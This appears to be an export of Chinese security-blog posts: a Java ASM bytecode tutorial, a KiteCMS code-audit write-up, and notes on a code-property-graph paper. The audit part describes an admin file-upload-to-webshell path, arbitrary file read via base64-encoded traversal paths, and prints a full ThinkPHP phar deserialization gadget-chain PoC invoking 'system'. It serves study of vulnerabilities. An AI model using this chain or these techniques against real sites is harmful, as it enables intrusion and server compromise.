&quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;try&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitLabel(label1);            Label label3 = new Label();            methodVisitor.visitJumpInsn(GOTO, label3);            methodVisitor.visitLabel(label2);            methodVisitor.visitVarInsn(ASTORE, 2);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;catch&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitLabel(label3);            methodVisitor.visitInsn(RETURN);            methodVisitor.visitMaxs(2, 3);            methodVisitor.visitEnd();        &#125;\n生成while语句\nwhile (true)&#123;  System.out.println(&quot;23333&quot;);&#125;\n&#123;methodVisitor = classWriter.visitMethod(ACC_PUBLIC, &quot;test&quot;, &quot;(I)V&quot;, null, null);methodVisitor.visitCode();Label label0 = new Label();methodVisitor.visitLabel(label0);methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);methodVisitor.visitLdcInsn(&quot;23333&quot;);methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);methodVisitor.visitJumpInsn(GOTO, label0);methodVisitor.visitMaxs(2, 2);methodVisitor.visitEnd();&#125;\nTODO 待解决：visitMaxs() 参数如何确定？\n实际上并不需要注意计算，只需要当成一个占位符即可。通常情况下在创建ClassWriter 都会传入 flag COMPUTE_FRAMES 来自动帮我们计算 max_stack 和 max_local\ndemo：遍历一个类的基本信息\npublic static void main(String[] args) throws Exception &#123;        String className = &quot;Test&quot;;        try &#123;            final ClassReader cr = new ClassReader(className);            System.out.println(                    &quot;解析类名：&quot; + cr.getClassName() + &quot;,父类：&quot; + cr.getSuperName() +                            &quot;,实现接口：&quot; + Arrays.toString(cr.getInterfaces()));            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);            // 使用自定义的ClassVisitor访问者对象，访问该类文件的结构            cr.accept(new ClassVisitor(ASM9) &#123;                @Override                public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) &#123;                    System.out.println(                            &quot;变量修饰符：&quot; + access + &quot;\\t 类名：&quot; + name + &quot;\\t 父类名：&quot; + superName +                                    &quot;\\t 实现的接口：&quot; + Arrays.toString(interfaces)                    );                    System.out.println(&quot;-----------------------------------------------------------------------------&quot;);                    super.visit(version, access, name, signature, superName, interfaces);                &#125;                @Override                public FieldVisitor visitField(int access, String name, String desc, String signature, Object value) &#123;                    System.out.println(                            &quot;变量修饰符：&quot; + access + &quot;\\t 变量名称：&quot; + name + &quot;\\t 描述符：&quot; + desc + &quot;\\t 默认值：&quot; + value                    );                    return super.visitField(access, name, desc, signature, value);                &#125;                @Override                public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) &#123;                    System.out.println(&quot;方法修饰符：&quot; + access + &quot;\\t 方法名称：&quot; + name + &quot;\\t 描述符：&quot; + desc +                            &quot;\\t 抛出的异常：&quot; + Arrays.toString(exceptions));                    return super.visitMethod(access, name, desc, signature, exceptions);                &#125;            &#125;, EXPAND_FRAMES);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;\n\ndemo：修改类名/方法名/方法修饰符\n利用ClassWriter可以实现类修改功能，如果插入了新的局部变量、字节码，需要重新计算max_stack 和 max_localsASM为我们提供了内置的自动计算方式，只需在创建ClassWriter的时候传入COMPUTE_FRAMES即可：new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);\npublic static void main(String[] args) throws Exception &#123;        String className = &quot;asm.HelloWorld&quot;;        // 定义修改后的类名//        final String newClassName = &quot;JavaSecTestHelloWorld&quot;;        try &#123;            final ClassReader cr = new ClassReader(className);            // 创建ClassWriter对象，COMPUTE_FRAMES会自动计算 max_stack 和 max_locals            ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);            // 使用自定义的ClassVisitor访问者对象，访问该类文件的结构            cr.accept(new ClassVisitor(ASM9, cw) &#123;                @Override                public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) &#123;                    super.visit(version, access, name, signature, superName, interfaces);                &#125;                @Override                public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123;                    // 将 hello 方法名修改为 hi                    if (name.equals(&quot;setTest&quot;)) &#123;                        // 修改方法访问修饰符，移除 public 属性，修改为 private                        access = access &amp; ~ACC_PUBLIC | ACC_PRIVATE;                    &#125;                    return super.visitMethod(access, &quot;hi&quot;, descriptor, signature, exceptions);                &#125;            &#125;, EXPAND_FRAMES);            String filePath = &quot;D:\\\\ctf\\\\JNDI\\\\tool\\\\JNDIEXP\\\\src\\\\test\\\\java\\\\asm\\\\HelloWorld.class&quot;;            byte[] bytes = cw.toByteArray();            FileOutputStream outputStream = new FileOutputStream(filePath);            outputStream.write(bytes);            outputStream.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;\ndemo3 修改类方法字节码：\n以 HelloWorld#hello()方法为例，在原业务逻辑执行前打印出该方法的参数值；修改该方法的返回值\npublic static void main(String[] args) throws Exception &#123;        String className = &quot;asm.HelloWorld&quot;;        // 定义修改后的类名//        final String newClassName = &quot;JavaSecTestHelloWorld&quot;;        try &#123;            final ClassReader cr = new ClassReader(className);            // 创建ClassWriter对象，COMPUTE_FRAMES会自动计算 max_stack 和 max_locals            ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);            System.out.println(&quot;-----------------------------------------------------------------------------&quot;);            // 使用自定义的ClassVisitor访问者对象，访问该类文件的结构            cr.accept(new ClassVisitor(ASM9, cw) &#123;                @Override                public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) &#123;                    super.visit(version, access, name, signature, superName, interfaces);                &#125;                @Override                public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123;                    if (name.equals(&quot;hello&quot;)) &#123;                        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);                        // 创建自定义的MethodVisitor，修改原方法的字节码                        return new AdviceAdapter(api, mv, access, name, descriptor) &#123;                            // 获取 String的ASM Type对象                            private final Type stringType = Type.getType(String.class);                            int newArgIndex;                            @Override                            protected void onMethodEnter() &#123;                                // 输出 hello 方法的第一个参数，因为 hello 是非 static 方法，所以 0 是 this，第一个参数的下标应该是 1                                mv.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);                                mv.visitVarInsn(ALOAD, 1);                                mv.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;);                                // 创建一个新的局部变量，newLocal会计算出这个新局部对象的索引位置                                newArgIndex = newLocal(stringType);                                // 将int, float或String型常量值从常量池中推送至栈顶                                mv.visitLdcInsn(&quot;fuck you!&quot;);                                // Generates the instruction to store the top stack value in the given local variable                                storeLocal(newArgIndex, stringType);                            &#125;                            @Override                            protected void onMethodExit(int opcode) &#123;                                dup();  // 复制栈顶的返回值                                // 创建一个新的局部变量，并获取索引位置                                int returnValueIndex = newLocal(stringType);                                // 将栈顶的返回值压入新生成的局部变量中                                storeLocal(returnValueIndex, stringType);                                // 输出 hello 方法的返回值                                // 获取指定类的静态域，并将其值压入栈顶                                mv.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);                                mv.visitVarInsn(ALOAD, returnValueIndex);                                mv.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;);                                // 压入方法进入 (onMethodEnter) 存入到局部变量的 var2值 到栈顶                                loadLocal(newArgIndex);                                // 返回一个引用类型，即栈顶的var2字符串，return var2;                                // 需要特别注意的是不同数据类型应当使用不同的RETURN指令                                mv.visitInsn(ARETURN);                            &#125;                        &#125;;                    &#125;                    return super.visitMethod(access, &quot;hi&quot;, descriptor, signature, exceptions);                &#125;            &#125;, EXPAND_FRAMES);            String filePath = &quot;D:\\\\ctf\\\\JNDI\\\\tool\\\\JNDIEXP\\\\src\\\\test\\\\java\\\\asm\\\\HelloWorld.class&quot;;            byte[] bytes = cw.toByteArray();            FileOutputStream outputStream = new FileOutputStream(filePath);            outputStream.write(bytes);            outputStream.close();        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;\ndemo4：动态创建Java类二进制\n可以使用ClassWriter来动态创建出一个Java类的二进制文件，然后通过自定义的类加载器就可以将我们动态生成的类加载到JVM中。\npublic class ASM2 implements Opcodes &#123;    private static final String CLASS_NAME = &quot;asm.TestASMHelloWorld&quot;;    private static final String CLASS_NAME_ASM = &quot;asm/TestASMHelloWorld&quot;;    public static byte[] dump() throws Exception &#123;        // 创建 ClassWriter，用于生成类字节码        ClassWriter cw = new ClassWriter(0);        // 创建 MethodVisitor        MethodVisitor mv;        // 创建一个字节码版本为 JDK1.7 的目标类        cw.visit(V1_7, ACC_PUBLIC + ACC_SUPER, CLASS_NAME_ASM, null, &quot;java/lang/Object&quot;, null);        // 设置源码文件名       \t cw.visitSource(&quot;TestHelloWorld.java&quot;, null);        // 创建一个空的构造方法，        // public TestASMHelloWorld() &#123;        // &#125;        &#123;            mv = cw.visitMethod(ACC_PUBLIC, &quot;&lt;init&gt;&quot;, &quot;()V&quot;, null, null);            mv.visitCode();            Label l0 = new Label();            mv.visitLabel(l0);            mv.visitLineNumber(5, l0);            mv.visitVarInsn(ALOAD, 0);            mv.visitMethodInsn(INVOKESPECIAL, &quot;java/lang/Object&quot;, &quot;&lt;init&gt;&quot;, &quot;()V&quot;, false);            mv.visitInsn(RETURN);            Label l1 = new Label();            mv.visitLabel(l1);            mv.visitLocalVariable(&quot;this&quot;, &quot;L&quot;+CLASS_NAME_ASM+&quot;;&quot;, null, l0, l1, 0);            mv.visitMaxs(1, 1);            mv.visitEnd();        &#125;        // 创建一个hello方法，        // public static String hello() &#123;        //     return &quot;Hello World~&quot;;        // &#125;        &#123;            mv = cw.visitMethod(ACC_PUBLIC + ACC_STATIC, &quot;hello&quot;, &quot;()Ljava/lang/String;&quot;, null, null);            mv.visitCode();            Label l0 = new Label();            mv.visitLabel(l0);            mv.visitLineNumber(8, l0);            mv.visitLdcInsn(&quot;Hello World~&quot;);            mv.visitInsn(ARETURN);            mv.visitMaxs(1, 0);            mv.visitEnd();        &#125;        cw.visitEnd();        return cw.toByteArray();    &#125;    public static void main(String[] args) throws Exception &#123;        final byte[] classBytes = dump();        // 创建自定义类加载器，加载 ASM 创建的类字节码到 JVM        ClassLoader classLoader = new ClassLoader(ASM2.class.getClassLoader()) &#123;            @Override            protected Class&lt;?&gt; findClass(String name) &#123;                try &#123;                    return super.findClass(name);                &#125; catch (ClassNotFoundException e) &#123;                    return defineClass(CLASS_NAME, classBytes, 0, classBytes.length);                &#125;            &#125;        &#125;;        System.out.println(&quot;hello方法执行结果：&quot; + classLoader.loadClass(CLASS_NAME).getMethod(&quot;hello&quot;).invoke(null));    &#125;&#125;\nAdviceAdapter 用法：\n\nonMethodEnter()方法：在“方法进入”的时候，添加一些代码逻辑。\nonMethodExit()方法：在“方法退出”的时候，添加一些代码逻辑。\n\n注意事项：\n\n\n第一点，对于onMethodEnter()和onMethodExit()这两个方法，都要注意Subclasses can use or change all the local variables, but should not change state of the stack。也就是说，要保持 operand stack 在修改前和修改后是一致的。\n第二点，对于onMethodExit()方法，要注意The top element on the stack contains the return value or the exception instance。也就是说，“方法退出”的时候，operand stack上有返回值或异常对象，不要忘记处理，不要弄丢了它们。\n\n\ndemo：打印方法参数和返回值\npublic class Analysis &#123;    private String name;    private int age;    public Analysis(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public void test(long idCard, Object obj) &#123;        int hashCode = 0;        hashCode += name.hashCode();        hashCode += age;        hashCode += (int) (idCard % Integer.MAX_VALUE);        hashCode += obj.hashCode();        hashCode = Math.abs(hashCode);        System.out.println(&quot;Hash Code is &quot; + hashCode);        if (hashCode % 2 == 1) &#123;            throw new RuntimeException(&quot;illegal&quot;);        &#125;    &#125;&#125;\n工具类 \npublic class ParameterUtils &#123;    private static final DateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);    public static void printValueOnStack(Object value) &#123;        if (value == null) &#123;            System.out.println(&quot;    &quot; + value);        &#125; else if (value instanceof String) &#123;            System.out.println(&quot;    &quot; + value);        &#125; else if (value instanceof Date) &#123;            System.out.println(&quot;    &quot; + fm.format(value));        &#125; else if (value instanceof char[]) &#123;            System.out.println(&quot;    &quot; + Arrays.toString((char[]) value));        &#125; else &#123;            System.out.println(&quot;    &quot; + value.getClass() + &quot;: &quot; + value.toString());        &#125;    &#125;    public static void printText(String text) &#123;        System.out.println(text);    &#125;&#125;\npublic class ClassPrintParameterVisitor extends ClassVisitor &#123;    public ClassPrintParameterVisitor(int api, ClassVisitor classVisitor) &#123;        super(api, classVisitor);    &#125;    @Override    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) &#123;        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);        if (mv != null) &#123;            boolean isAbstractMethod = (access &amp; Opcodes.ACC_ABSTRACT) != 0;            boolean isNativeMethod = (access &amp; Opcodes.ACC_NATIVE) != 0;            if (!isAbstractMethod &amp;&amp; !isNativeMethod) &#123;            &#125;        &#125;        return mv;    &#125;    public static class MethodPrintParameterAdapter extends AdviceAdapter &#123;        public MethodPrintParameterAdapter(int api, MethodVisitor methodVisitor, int access, String name, String descriptor) &#123;            // AdviceAdapter 为 protected 类型的构造方法，因此只能子类访问            super(api, methodVisitor, access, name, descriptor);        &#125;        @Override        protected void onMethodEnter() &#123;            printMessage(&quot;Method Enter: &quot; + getName() + methodDesc);            Type[] argumentTypes = getArgumentTypes();            for (int i = 0; i &lt; argumentTypes.length; i++) &#123;                Type t = argumentTypes[i];                loadArg(i);                box(t);                printValueOnStack(&quot;(Ljava/lang/Object;)V&quot;);            &#125;        &#125;        @Override        protected void onMethodExit(int opcode) &#123;            printMessage(&quot;Method Exit: &quot; + getName() + methodDesc);            if (opcode == ATHROW) &#123;                super.visitLdcInsn(&quot;abnormal return&quot;);            &#125; else if (opcode == RETURN) &#123;                super.visitLdcInsn(&quot;return void&quot;);            &#125; else if (opcode == ARETURN) &#123;                dup();            &#125; else &#123;                if (opcode == LRETURN || opcode == DRETURN) &#123;                    dup2();                &#125; else &#123;                    dup();                &#125;                box(getReturnType());            &#125;            printValueOnStack(&quot;(Ljava/lang/Object;)V&quot;);        &#125;        private void printMessage(String str) &#123;            super.visitLdcInsn(str);            super.visitMethodInsn(INVOKESTATIC, &quot;asm/ParameterUtils&quot;, &quot;printText&quot;, &quot;(Ljava/lang/String;)V&quot;, false);        &#125;        private void printValueOnStack(String descriptor) &#123;            super.visitMethodInsn(INVOKESTATIC, &quot;asm/ParameterUtils&quot;, &quot;printValueOnStack&quot;, descriptor, false);        &#125;    &#125;&#125;\n实现转换\n参考链接https://github.com/Y4tacker/JavaSec/blob/main/1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/ASM%E5%AD%A6%E4%B9%A0/index.md\nhttps://javasec.org/javase/JavaByteCode/\nhttps://lsieun.github.io/java-asm-01/advice-adapter-intro.html\n","tags":["Java"]},{"title":"跟着Y4师傅学代码审计-KiteCMS","url":"/2022/12/04/KiteCMS%E5%88%86%E6%9E%90/","content":"写在前面这是代码审计的第三套源码Kitecms，慢慢沉淀，加油加油\n\n环境搭建Windows 11 家庭中文版php: PHP 7.3.0apachemysql: 5.5.53\n\n漏洞测试与分析后台文件上传\n测试\n在后台admin/site/config.html?config_name=uploadFile处我们可以修改可上传文件类型后缀，加一个php\n\n之后我们随便找一个上传点（后台），抓包上传恶意文件\n\n回显上传路径后访问即可触发\n\n\n分析\n根据Y4师傅所述，网站有针对用户在session中设置权限的操作，我们先分析分析\n从这里作为进入入口http://localhost/admin/passport/login.html，定位至`admin\\Passport.php`的`login()`函数\n首先获取完参数，并作校验后，会查auth_user表进行比对\n\n该表中还存在一个role_ids字段，应该是和权限有关，我们留意一下\n\n验证完密码后，会调用Auth::createSession()方法，其中会根据用户的uid值设置admin模块下的默认站点Session值，对于site_id字段，如果是admin用户的话就是1\n\n之后还会设置用户数据SESSION，会有签名\n\n大概弄清了Session的设置后，我们看看在修改配置中的图片类型是怎样的走的\n根据路由admin/site/config.html?config_name=uploadFile首先定位至admin\\Site.php中的config方法，首先会根据每一个传参数据调用SiteConfig::saveCofig()方法，留意这里出现了session中的site_id字段，同时我们修改的图片类型位于键名为upload_image_ext\n\n\n跟入看到执行了数据库操作，首先会根据site_id作筛选，然后才会根据更新对应的k值，也就是说site_id的值决定了我们能改的范围\nstatic public function saveCofig($site_id, $k, $v)    &#123;        return self::where(&#x27;site_id&#x27;, $site_id)            -&gt;where(&#x27;k&#x27;, $k)            -&gt;update([&#x27;v&#x27; =&gt; $v]);    &#125;\n\n然后我们去看看文件上传处\n根据路由/admin/upload/uploadfile.html定位至\\admin\\Upload.php的uploadfile函数处\n这里可以看到还是会根据site_id值来初始化UploadFile类\n\n我们先跟入分析一下，这里首先会从数据库里读取配置（也就是我们刚才设置的那些），合并到config变量里\n\n针对每一个配置项，还会去调用SiteConfig::getCofig($site_id, $k)方法，刚才已经见过了会根据site_id值去数据库里查数据。所以这里也就是说，如果数据库里存在对应的配置项的话就优先用数据库里的，应该是防止出现冲突吧，最后合并配置写到最终的属性config当中\nforeach ($config as $k =&gt; $v) &#123;            if (!empty(SiteConfig::getCofig($site_id, $k))) &#123;                $newConfig[$k] = SiteConfig::getCofig($site_id, $k);            &#125;        &#125;\n然后经过初始化操作之后，就会执行upload方法了\n这里也就是先验证文件类型、然后上传文件。除了验证后缀和大小也就没其他的了\ncase &#x27;image&#x27;:    $result = $file-&gt;check([&#x27;ext&#x27; =&gt; $this-&gt;config[&#x27;upload_image_ext&#x27;], &#x27;size&#x27; =&gt; $this-&gt;config[&#x27;upload_image_size&#x27;]*1024]);    if(empty($result))&#123;        // 上传失败获取错误信息        $this-&gt;error = $file-&gt;getError();        return false;    &#125;    break;\n\n\n任意文件读取这次来看模板修改功能点，根据路由admin/template/fileedit.html定位至admin\\Template.php的fileedit函数\npublic function fileedit()    &#123;        if (Request::isAjax()) &#123;            $request = Request::param();            $encode = mb_detect_encoding($request[&#x27;html&#x27;], array(&#x27;ASCII&#x27;, &#x27;UTF-8&#x27;, &#x27;GB2312&#x27;, &#x27;GBK&#x27;, &#x27;BIG5&#x27;));            $request[&#x27;path&#x27;] = base64_decode($request[&#x27;path&#x27;]);            if ($encode != &#x27;UTF-8&#x27;) &#123;                $request[&#x27;html&#x27;] = iconv($encode, &#x27;UTF-8&#x27;, $request[&#x27;html&#x27;]);            &#125;            if (file_exists($request[&#x27;path&#x27;])) &#123;                if (is_writable($request[&#x27;path&#x27;])) &#123;                    $html = file_put_contents($request[&#x27;path&#x27;], htmlspecialchars_decode($request[&#x27;html&#x27;]));                &#125; else &#123;                    throw new HttpException(404, &#x27;File not readabled&#x27;);                &#125;            &#125; else &#123;                throw new HttpException(404, &#x27;This is not file&#x27;);            &#125;            if ($html) &#123;                return $this-&gt;response(200, Lang::get(&#x27;Success&#x27;));            &#125; else &#123;                return $this-&gt;response(201, Lang::get(&#x27;Fail&#x27;));            &#125;        &#125;        $request = Request::param(&#x27;path&#x27;);        $path = base64_decode($request);        if (file_exists($path)) &#123;            if (is_readable($path)) &#123;                $html = file_get_contents($path);            &#125; else &#123;                throw new HttpException(404, &#x27;File not readabled&#x27;);            &#125;        &#125; else &#123;            throw new HttpException(404, &#x27;This is not file&#x27;);        &#125;        $data = [            &#x27;html&#x27; =&gt; htmlspecialchars($html),            &#x27;path&#x27; =&gt; $request,            &#x27;name&#x27; =&gt; base64_decode(Request::param(&#x27;name&#x27;)),        ];        return $this-&gt;fetch(&#x27;fileedit&#x27;, $data);    &#125;\n这里的逻辑就是根据get或者post得到path变量，经过base64解码，可以实现任意读写。如果是读的话就是get请求，写的话就是post请求。由于没有作任何检验，我们可以利用目录穿越读取任意文件。\n正常请求时查询按照绝对路径来查\n\n那我们读一下配置\nD:/phpstudy/WWW/config/database.php\n\nphar 反序列化漏洞source点在application/admin/controller/Template.php的filelist函数，其中调用了Admin类的getTpl方法\n类中的scanFiles()方法有is_dir()可以导致phar反序列化，我这里的疑问是dir参数好像可以直接传参？\n\n这里thinkphp版本为5.1.37，找一个poc生成phar\n&lt;?phpnamespace think;abstract class Model&#123;    protected $append = [];    private $data = [];    function __construct()&#123;        $this-&gt;append = [&quot;ethan&quot;=&gt;[&quot;dir&quot;,&quot;calc&quot;]];        $this-&gt;data = [&quot;ethan&quot;=&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook = [];    protected $filter = &quot;system&quot;;    protected $config = [// 表单请求类型伪装变量        &#x27;var_method&#x27;       =&gt; &#x27;_method&#x27;,// 表单ajax伪装变量        &#x27;var_ajax&#x27;         =&gt; &#x27;_ajax&#x27;,// 表单pjax伪装变量        &#x27;var_pjax&#x27;         =&gt; &#x27;_pjax&#x27;,// PATHINFO变量名 用于兼容模式        &#x27;var_pathinfo&#x27;     =&gt; &#x27;s&#x27;,// 兼容PATH_INFO获取        &#x27;pathinfo_fetch&#x27;   =&gt; [&#x27;ORIG_PATH_INFO&#x27;, &#x27;REDIRECT_PATH_INFO&#x27;, &#x27;REDIRECT_URL&#x27;],// 默认全局过滤方法 用逗号分隔多个        &#x27;default_filter&#x27;   =&gt; &#x27;&#x27;,// 域名根，如thinkphp.cn        &#x27;url_domain_root&#x27;  =&gt; &#x27;&#x27;,// HTTPS代理标识        &#x27;https_agent_name&#x27; =&gt; &#x27;&#x27;,// IP代理获取标识        &#x27;http_agent_ip&#x27;    =&gt; &#x27;HTTP_X_REAL_IP&#x27;,// URL伪静态后缀        &#x27;url_html_suffix&#x27;  =&gt; &#x27;html&#x27;,    ];    function __construct()&#123;        $this-&gt;filter = &quot;system&quot;;        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;&#x27;];        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];    &#125;&#125;namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think\\model;use Phar;use think\\Model;class Pivot extends Model&#123;&#125;use think\\process\\pipes\\Windows;$a = new Windows();@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();\n然后上传文件\n\n?dir=phar://./upload/20221204/91765e963b1efb9755077c6d317382a8.png\n我这里是没打成功，但是参数确实是传的没问题。看来还是得细致的过一下经典的tp反序列化链啊。而且这里tp版本是5.1.37，应该还有一些其他可利用的框架漏洞\n这里就先找一下可利用的入口吧，和上面类似的phar反序列化触发点还有scanFilesForTree()\n\n还有一处是在刚才Upload处，我们在初始化Upload类时，有一个uploadHandler()方法调用，这里获取了一个配置（从数据库里拿的），肯定在后台可以改（这个有印象的话应该是对应的上传驱动那里\n\n之后就是upload操作，前面已经说了，后面调用了$this-&gt;uploadHandler-&gt;upload($file)\ntype选择的是local的话，刚才就会动态加载该app\\common\\model\\upload\\driver\\Local类，可以看到upload方法中出现了sink点，参数upload_path同样在后台可以修改，可用来利用phar反序列化漏洞\n\n参考链接https://www.kancloud.cn/kite/book/1136594\nhttps://y4tacker.blog.csdn.net/article/details/115759642\nhttps://ego00.blog.csdn.net/article/details/117818074\n","tags":["代码审计"]},{"title":"《Modeling and Discovering Vulnerabilities with Code Property Graphs》论文笔记","url":"/2023/02/19/Modeling%20and%20Discovering%20Vulnerabilities%20with%20Code%20Property%20Graphs%20%E7%B2%BE%E8%AF%BB/","content":"Modeling and Discovering Vulnerabilities with Code Property Graphs\n\nAbstract\n​        当前安全漏洞的威胁大多源于不安全的代码所致，因此为解决该问题需要专业人员单调且易出错的大量审计工作。在本文中，提出了一种有效地挖掘大量源代码漏洞的方法。通过引入一种针对源代码的新型表示——代码属性图，也就是结合经典程序分析当中概念：抽象语法树、控制流图以及程序依赖图，构成一种联合数据结构。这种表示使我们可以利用图遍历的方式对常见漏洞进行建模。用图数据库来实现。\n\nKeywords\n漏洞；静态分析；图数据库\n\nI. Introduction\n​        计算机系统的安全性取决于底层软件的代码质量。这是因为常见的漏洞通常都会在程序代码当中表现出来，例如未考虑缓冲区边界或者对输入数据的不充分检查。\n​        由于一个程序不能识别另一个程序的非平凡属性（这个属性不对所有程序都为真或者为假），因此查找软件漏洞的一般问题是不可判定的（莱斯定理）。当前的方法要么仅限于指定类型的漏洞，要么就是大量的人工审计。特别是针对操作系统内核这样的大型程序工程，即使一个漏洞都可能会导致整个程序的安全问题，然后即使是一些存在已久的经典类型漏洞，如缓冲区溢出等，如果没有大量的专家知识储备，也是很难发现的。\n​        安全研究最初关注在指定类型漏洞的挖掘上，后来基于软件测试的概念，衍生出利用动态分析来检测，包括从简单的模糊测试到高级污点追踪和符号执行技术。但是这些方法会受制于运行时间过长或执行路径呈指数增长需要考虑。所以作为补救，通常是利用专家知识扩充静态程序分析来辅助人工审计。\n​        本文提出的方法结合了程序分析的经典概念和图挖掘领域的最新发展。方法的思想在于许多漏洞只能通过综合考虑代码的结构、控制流和依赖性才能发现。因此我们为处理这个需求，引入源程序的新型表示——代码属性图。该图结合了抽象语法树、控制流图以及程序依赖图构成联合数据结构，这种对代码的综合视角使得我们可以利用图遍历的方式对常见的漏洞进行建模。类似于数据库的查询，图遍历的方式使得我们可以审查程序结构中相应结点的属性，从而为几种类型的漏洞做成简洁的模板，从而帮助审计大量代码的漏洞。\n​        实验过程是先用流行的图数据库实现并针对几种已知的漏洞设计图遍历，并运用在 2012 Linux Knernel 的漏洞检测中。\n\nII. Representations Of Code\n本文关注于三种代码表示：抽象语法树（AST）、控制流图（CFG）以及程序依赖图（PDG），以图1为例作说明\n\n\n\nA. AST\n抽象语法树通常作为编译器分析器产生的第一个中间表示，它如实编码了 statements 和 expressions 是如何嵌套生成程序的。与解析树相比，抽象语法树不再表示为表达程序而选择的具体语法。    \n抽象语法树是一种有序树，其内部结点表示操作符，而叶子结点表示操作数。        虽然抽象语法树非常适合于简单的代码转换，并且已经被用来标识语义相似的代码，它们不适用于更高级的代码分析，例如检测死代码或未初始化的变量。原因在于这种形式的表示既没有明确表示控制流图，也没有明确的数据依赖关系。\n\nB. CFG\n控制流图明确地描述了代码语句的执行顺序以及触发特定执行路径所需满足的条件。为此，statements 和 predicates 由结点来表示，利用有向边连接来指示控制的转移。虽然这些边不需要排序，但需要指定 $true,false$ 或 $\\epsilon$ 标签。特别地，statement 结点拥有标记为 $\\epsilon$ 的出边，同时 predicate 结点具有对于其计算结果的 $ture，false$ 两条出边。控制流图可以从抽象语法树以两个步骤的过程构造：1. 结构化控制语句（例如，if、while、for）来构建初步控制流图；2. 通过额外考虑诸如goto、break和continue之类的非结构化控制语句来校正初步控制流图。\n\n缺点在于控制流图不能提供数据流信息，在漏洞分析中这意味着不能识别到那些处理受攻击者影响数据的 statements\nC. PDG\n程序依赖关系图显式地表示 statements 和 predicates 之间的依赖关系。图由两种类型的边构建：数据依赖边反映变量之间的相互影响，而控制依赖边 predicates 对变量值的影响。程序依赖图边的构建可以通过控制流图首先确定每个 statement 定义的变量集和使用的变量集，然后计算每个 statement 和 predicate 的 reaching definitions。\n\n可以看到相比于 CFG，statements 的执行顺序不再能从图中确定，而 statements 和 predicates 之间的依赖关系却清晰可见。\n\nIII. Property Graphs And Traversals \n\n首先给出代码属性图的定义：\nDefinition 1.  属性图 $G = (V,E,\\lambda, \\mu)$ 是有向的、标记边的、具有多重属性图。其中 V 是一系列结点，E是有向边集合，且 $\\lambda：E \\to \\sum$ 是一个边标记函数，其将来自字母表 Σ 的标记分配给每个边。属性可以通过函数 $\\mu:(V\\ \\cup\\ E) \\times K\\to S$ 来指定，其中 K 是属性的 key 集合，S 是属性的值集合。\n图的遍历定义如下：\nDefinition 2.  图遍历是函数  $T : P(V) → P(V)$ ，其是结点到结点根据属性图 G 的映射，其中 P 是 V 的幂集。\n这个通用定义允许我们将多个遍历连接起来，利用一个函数组合符号 $◦$. \n首先我们先定义一个简单的过滤遍历：\n\nFILTER_p(X) = \\{v ∈ X : p(v)\\}它将返回所有集合 X 中匹配布尔谓词 p(v) 的结点。\n前向分析：\n\n由上至下增加边标记以及属性的指定过滤。类似地后向分析如下：\n\n最后定义两种遍历 OR 和 AND 来将其他遍历的结果作聚合：\n\nIV. Code Property Graphs\n我们首先将 AST、CFG 和 PDG 建模为属性图，然后将它们合并成一个图，提供各个表示的所有优点\nA. Transforming the AST\nAST 提供提供源代码到语言结构的详细分解。我们将 AST 表达为 $G_A=(V_A,E_A,\\lambda_A,\\mu_A)$  